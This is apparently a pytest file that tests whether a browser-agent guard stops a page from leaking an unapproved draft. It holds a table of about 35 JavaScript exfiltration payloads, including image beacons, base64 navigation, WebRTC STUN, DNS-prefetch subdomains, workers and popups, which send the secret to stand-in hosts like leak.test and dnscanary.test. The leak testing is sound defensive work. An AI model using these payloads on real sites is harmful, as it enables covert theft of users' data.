import os, json, socket, subprocess, time, base64, shutil, asyncio, glob
import pytest, pytest_asyncio
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import threading
from playwright.async_api import async_playwright
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from app.core.database import Base
from app.core.models import ApprovalStatus
from app.modules.m00_approval_center.service import Service
from app.modules.m13_browser_agent.pc_daemon.config import DaemonConfig
from app.modules.m13_browser_agent.pc_daemon.daemon import Daemon, DeviceIdentity
from app.modules.m13_browser_agent.session_bridge.dispatch import BridgedSessions, ConnectionHub, DaemonConnection
from app.modules.m13_browser_agent.session_bridge.registry import BridgeRegistry
from app.modules.m18_side_hustle_scraper.login_runner import BrowserRecipe, LoginRunStore
from app.modules.m18_side_hustle_scraper.login_routes import build_login_runner
from test_m18_login_browser import _compose_with_values
from test_m18_login_round5 import _nav_click
from test_aud_round7 import SECRET, leaked, on_click, X, D, POST, BTN

MODE = os.environ.get('MODE', 'persistent')
UDP=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);UDP.bind(('127.0.0.1',0));UDP_PORT=UDP.getsockname()[1];UDP.settimeout(0.1)
CDP_PORT = 9333
def ARGS(tmp_path):
    a = ['--host-resolver-rules=MAP *.leak.test 127.0.0.1, MAP leak.test 127.0.0.1', '--headless=new', '--no-sandbox',
         f'--log-net-log={tmp_path}/netlog.json', '--net-log-capture-mode=Everything']
    return a
async def start_mode(daemon, config, tmp_path):
    pw = None; proc = None
    if MODE == 'cdp':
        args = ['google-chrome', '--headless=new', '--no-sandbox', f'--remote-debugging-port={CDP_PORT}', f'--user-data-dir={tmp_path}/chromeprof',
                *[x for x in ARGS(tmp_path) if x != '--headless=new']]
        proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for _ in range(50):
            try: socket.create_connection(('127.0.0.1', CDP_PORT), 0.2).close(); break
            except OSError: time.sleep(0.2)
        config.cdp_url = f'http://127.0.0.1:{CDP_PORT}'
    elif MODE == 'persistent':
        config.profile_dir = str(tmp_path / 'prof')
    await daemon.browser.start()
    return None, proc
async def stop_mode(daemon, pw, proc):
    try:
        if MODE == 'cdp':
            proc.terminate(); proc.wait(10)
        await daemon.browser._playwright.stop() if MODE == 'cdp' else await daemon.browser._context.close()
    except Exception as e: print('stop err', e)
    if MODE == 'persistent':
        try: await daemon.browser._playwright.stop()
        except Exception: pass
@pytest_asyncio.fixture
async def setup_mode(tmp_path):
    class Site(BaseHTTPRequestHandler):
        posts = []
        keys = []
        commands = []
        extra_field = None
        submit_attr = None
        html_hook = None
        post_paths = []
        redirect = None
        redirects = {}
        hits = []
        def log_message(self, *args): pass
        def do_GET(self):
            self.hits.append((self.headers['Host'], 'GET', self.path, ''))
            if self.path == '/throttle':
                self.send_response(429); self.end_headers(); return
            self.send_response(200); self.send_header('Content-Type', 'text/html'); self.end_headers()
            if self.path == '/captcha':
                html = 'captcha'
            else:
                html = '''<html><body><div id="account"></div><script>
                document.querySelector('#account').textContent=localStorage.getItem('owner')||'';
                </script><a class="source" href="/idea">Offer a small tutoring pilot and measure actual interest.</a>
                <form method="post" action="/publish"><p id="terms">Free publication. No fees.</p>
                <label>Public draft<textarea id="draft" name="draft"></textarea></label>
                <input name="audience" value="public"><input id="run_id" name="run_id"><button id="publish">Publish once</button></form>'''
                if self.submit_attr and self.path == '/compose':
                    html = html.replace('<button id="publish"', '<button id="publish" '+self.submit_attr[0]+'="'+self.submit_attr[1]+'"')
                if self.extra_field and self.path == '/compose':
                    html = html.replace('</form>', '<input name="'+self.extra_field+'" value="DO_NOT_COPY"></form>')
                if Site.html_hook and self.path == '/compose':
                    html = Site.html_hook(html)
                if self.path == '/receipt' and self.posts:
                    html += '<div id="receipt">'+str(len(self.posts))+'</div><div id="published">'+self.posts[-1]+'</div><div id="receipt_account">owner</div><div id="receipt_run">'+self.keys[-1]+'</div>'
                html += '</body></html>'
            self.wfile.write(html.encode())
        def do_POST(self):
            from urllib.parse import parse_qs
            body = self.rfile.read(int(self.headers['Content-Length'])).decode()
            self.post_paths.append(self.path)
            self.hits.append((self.headers['Host'], self.command, self.path, body))
            if self.path in Site.redirects:
                self.send_response(Site.redirects[self.path][0]); self.send_header('Location', Site.redirects[self.path][1]); self.end_headers(); return
            if self.path == '/publish' and Site.redirect:
                self.send_response(Site.redirect[0]); self.send_header('Location', Site.redirect[1]); self.end_headers(); return
            if self.path != '/publish':
                self.send_response(200); self.end_headers(); return
            self.posts.append(parse_qs(body)['draft'][0])
            self.keys.append(parse_qs(body)['run_id'][0])
            self.send_response(303); self.send_header('Location', '/receipt'); self.end_headers()
    server = ThreadingHTTPServer(('127.0.0.1', 0), Site)
    thread = threading.Thread(target=server.serve_forever, daemon=True); thread.start()
    origin = f'http://127.0.0.1:{server.server_port}'
    engine = create_engine(f'sqlite:///{tmp_path}/sql.db'); Base.metadata.create_all(engine)
    sql = sessionmaker(bind=engine, expire_on_commit=False)
    approvals, registry = Service(sql), BridgeRegistry(sql)
    identity = DeviceIdentity.load_or_create(tmp_path/'device.pem')
    challenge = registry.create_challenge('tenant')
    caps = ['navigate', 'extract', 'screenshot', 'read_values', 'fill', 'click_submit']
    paired = registry.confirm_pairing(challenge['server_nonce'], challenge['code'], name='Local owner', public_key=identity.public_key_pem(), capabilities=caps)
    config = DaemonConfig(device_id=paired['device_id'], command_secret=paired['command_secret'], capabilities=caps, pacing_seconds=0, browser_args=ARGS(tmp_path), consumed_path=str(tmp_path/'consumed.json'))
    daemon = Daemon(config, identity); Site.daemon = daemon
    pw, browser = await start_mode(daemon, config, tmp_path)
    page = await daemon.browser.page('experiment')
    await page.goto(origin)
    # Owner login handoff, not an Atlas fill of any credential.
    await page.evaluate("localStorage.setItem('owner','owner')")
    await page.reload()
    class Wire:
        async def send_json(self, command):
            Site.commands.append(command)
            answer = await daemon.execute(command)
            await connection.handle_message(answer)
    connection = DaemonConnection(Wire(), paired['device_id'], 2)
    # Local fake-site tests do not need human-site pacing. Production clamps >=2s.
    connection.pacing_seconds = 0
    hub = ConnectionHub(); await hub.register(connection)
    sessions = BridgedSessions(registry, hub)
    recipe = BrowserRecipe('local_fixture', origin, origin+'/discover', origin+'/compose', '#account', '.source', '#draft', '#publish', '#terms', 'Free publication. No fees.', '#receipt', '#published', '#receipt_account', '#run_id', '#receipt_run', ('draft', 'audience', 'run_id'), True)
    store = LoginRunStore(tmp_path/'runs.db')
    def runner(recipes=None):
        return build_login_runner(store=store, sessions=sessions, approvals=approvals,
            recipes=recipes or {'local_fixture': recipe}, receipt_key=b'k'*32)
    yield runner, recipe, approvals, registry, paired, page, Site, tmp_path
    await stop_mode(daemon, pw, browser); server.shutdown(); thread.join(); server.server_close()



LEAKHOST = "'http://x.leak.test:'+location.port"
V = {
 'baseline_xorigin_img': on_click(f"new Image().src={X}+'/p/'+btoa({D})"),
 'xorigin_leakhost_img': on_click(f"new Image().src={LEAKHOST}+'/p/'+btoa({D})"),
 'secret_subdomain_img': on_click(f"new Image().src='http://'+{D}.toLowerCase()+'.leak.test:'+location.port+'/'"),
 'timer_20s_fetch_get': on_click(f"fetch('/pix?d='+btoa({D}))", 20000),
 'timer_20s_xorigin_img': on_click(f"new Image().src={X}+'/p/'+btoa({D})", 20000),
 'timer_20s_post': on_click(f"fetch('/publish',{POST})", 20000),
 'timer_20s_top_nav_b64': on_click(f"location.href='/idea/'+btoa({D})", 20000),
 'top_nav_b64_now': on_click(f"location.href='/idea/'+btoa({D})"),
 'top_nav_known_later_encoded_timer': on_click(f"location.href='/idea#'+btoa({D})", 8000),
 'hash_nav': on_click(f"location.hash=btoa({D})"),
 'meta_refresh_inject': on_click(f"const m=document.createElement('meta');m.httpEquiv='refresh';m.content='0;url=/idea/'+btoa({D});document.head.appendChild(m)"),
 'meta_refresh_xorigin': on_click(f"const m=document.createElement('meta');m.httpEquiv='refresh';m.content='0;url='+{X}+'/mr/'+btoa({D});document.head.appendChild(m)"),
 'iframe_contentwindow_rtc_udp': on_click("const f=document.createElement('iframe');document.body.appendChild(f);const pc=new f.contentWindow.RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:%d'}]});pc.createDataChannel('x');pc.createOffer().then(o=>pc.setLocalDescription(o))" % UDP_PORT),
 'rtc_udp_direct': on_click("const pc=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:%d'}]});pc.createDataChannel('x');pc.createOffer().then(o=>pc.setLocalDescription(o))" % UDP_PORT),
 'rtc_udp_cached_ctor': "window.__R=window.RTCPeerConnection;" + on_click("const pc=new window.__R({iceServers:[{urls:'stun:127.0.0.1:%d'}]});pc.createDataChannel('x');pc.createOffer().then(o=>pc.setLocalDescription(o))" % UDP_PORT),
 'rtc_srcdoc_iframe_udp': on_click("const f=document.createElement('iframe');f.srcdoc='<script>const pc=new RTCPeerConnection({iceServers:[{urls:\"stun:127.0.0.1:%d\"}]});pc.createDataChannel(\"x\");pc.createOffer().then(o=>pc.setLocalDescription(o))<\\/script>';document.body.appendChild(f)" % UDP_PORT),
 'webtransport_or_quic': on_click(f"try{{new WebTransport('https://127.0.0.1:{UDP_PORT}/')}}catch(e){{}}"),
 'beacon_keepalive_on_hide': on_click(f"addEventListener('pagehide',()=>fetch('/pix?d='+btoa({D}),{{keepalive:true}}));location.href='/idea'"),
 'bc_other_tab': "window.__bc=new BroadcastChannel('x');" + on_click("window.__bc.postMessage('draft=UNAPPROVEDSECRET&run_id=a')", 3500),
 'localstorage_other_tab': on_click(f"localStorage.setItem('leak',{D})"),
 'sharedworker_other_tab': on_click(f"new SharedWorker('data:text/javascript,onconnect=e=>e.ports[0].onmessage=m=>self.__d=m.data');"),
 'popup_cached_iframe_open': on_click(f"const f=document.createElement('iframe');document.body.appendChild(f);f.contentWindow.open({X}+'/po/'+btoa({D}))"),
 'popup_blank_then_write': on_click(f"const w=window.open('','_blank');if(w)w.document.write('<img src=\"{'http://localhost:'}'+location.port+'/pw/'+btoa({D})+'\">')"),
 'popup_blank_late': "window.__o=window.open;" + on_click(f"const w=window.__o('about:blank');w.location={X}+'/pl/'+btoa({D})", 15000),
 'sw_register': on_click("navigator.serviceWorker && navigator.serviceWorker.register('/sw.js')"),
 'pushstate_then_img_late': on_click(f"history.pushState({{}},'','/z/'+btoa({D}));", 1000),
 'worker_importscripts_late': on_click("const b=new Blob([\"setTimeout(()=>fetch('/publish',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:'draft=UNAPPROVEDSECRET&run_id=a'}),16000)\"]);new Worker(URL.createObjectURL(b))"),
 'form_target_blank_submit_late': on_click("const f=document.createElement('form');f.method='post';f.target='_blank';f.action='/publish';f.innerHTML='<input name=draft value=UNAPPROVEDSECRET><input name=run_id value=a>';document.body.appendChild(f);f.submit()", 12000),
 'dns_prefetch_secret': on_click(f"const l=document.createElement('link');l.rel='dns-prefetch';l.href='//'+{D}.toLowerCase()+'.dnscanary.test';document.head.appendChild(l)"),
 'preconnect_secret': on_click(f"const l=document.createElement('link');l.rel='preconnect';l.href='http://'+{D}.toLowerCase()+'.dnscanary2.test';document.head.appendChild(l)"),
 'rtc_stun_secret_host': on_click(f"new RTCPeerConnection({{iceServers:[{{urls:'stun:'+{D}.toLowerCase()+'.dnscanary3.test:3478'}}]}}).createDataChannel('x')"),
 'img_secret_host_dns': on_click(f"new Image().src='http://'+{D}.toLowerCase()+'.dnscanary4.test/'"),
 'prelist_known_url_exfil': """document.querySelector('#draft').addEventListener('input',e=>{document.querySelectorAll('.pl').forEach(x=>x.remove());const a=document.createElement('a');a.className='pl';a.href='/pl/'+btoa(e.target.value);a.textContent='.';document.body.appendChild(a)});""" + on_click("new Image().src=document.querySelector('.pl').href"),
 'prelist_known_url_xorigin': """document.querySelector('#draft').addEventListener('input',e=>{document.querySelectorAll('.pl').forEach(x=>x.remove());const a=document.createElement('a');a.className='pl';a.href='http://localhost:'+location.port+'/plx/'+btoa(e.target.value);a.textContent='.';document.body.appendChild(a)});""" + on_click("new Image().src=document.querySelector('.pl').href"),
 'prelist_known_nav': """document.querySelector('#draft').addEventListener('input',e=>{document.querySelectorAll('.pl').forEach(x=>x.remove());const a=document.createElement('a');a.className='pl';a.href='/pln/'+btoa(e.target.value);a.textContent='.';document.body.appendChild(a)});""" + on_click("location.href=document.querySelector('.pl').href"),
}
OTHER = {'bc_other_tab', 'localstorage_other_tab'}

@pytest.mark.asyncio
@pytest.mark.parametrize('name', sorted(V))
async def test_v(setup_mode, name):
    setup = setup_mode
    page, _ = await _compose_with_values(setup); site = setup[6]
    daemon = site.daemon
    other = None
    if name == 'bc_other_tab':
        # The guard DENIES the BroadcastChannel constructor in the GUARDED session page (form_guard.py
        # deny('BroadcastChannel')); an unguarded other tab can still create one. The attacking guarded page therefore
        # cannot build the vector, so this test asserts the denial, NOT an attack outcome. A vector through a channel
        # object that existed in the guarded page before the guard was installed is not constructed here: labeled gap.
        ctx = daemon.browser._context
        other = await ctx.new_page(); await other.goto(setup[1].origin+'/compose')
        # An unguarded OTHER owner tab can create a channel (it is not the guarded session page); the guarded
        # page cannot, so the attacking page has no way to post to it.
        await other.evaluate("new BroadcastChannel('x')")
        with pytest.raises(Exception, match='blocked by Atlas guard'):
            await page.evaluate(V[name])
        site.hits.clear(); site.posts.clear()
        assert site.posts == [] and leaked(site) == []
        return
    if name in OTHER:
        ctx = daemon.browser._context  # the owner's context
        other = await ctx.new_page(); await other.goto(setup[1].origin+'/compose')
        await other.evaluate("""(()=>{window.__got=[];window.__bc=new BroadcastChannel('x');__bc.onmessage=e=>{window.__got.push(e.data);fetch('/publish',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:e.data})};addEventListener('storage',e=>{window.__got.push('LS:'+e.newValue);fetch('/pix?d=LS'+btoa(e.newValue))})})()""")
        await page.goto(setup[1].origin+'/compose')
    await page.fill('#draft', SECRET)
    await page.evaluate(V[name])
    if 'prelist' in name: await page.fill('#draft', SECRET+'2')
    site.hits.clear(); site.posts.clear(); site.post_paths.clear()
    answer = await _nav_click(setup, '#attack')
    for _ in range(32 if '20s' in name or 'late' in name else 14): await page.wait_for_timeout(700)
    udp=[]
    try:
        while True: udp.append(UDP.recvfrom(2000)[0][:12])
    except Exception: pass
    got = None
    if other:
        try: got = await other.evaluate("window.__got")
        except Exception as e: got = 'err'
    print(f"RESULT[{MODE}] {name}: udp={len(udp)} ok={answer['ok']} err={str(answer.get('error'))[:60]!r} leaked={leaked(site)} posts={site.posts} other_tab_got={got} hits={[h[0][:9]+h[2][:30] for h in site.hits if h[2] != '/compose'][:6]} isolated={daemon.browser.isolated}", flush=True)
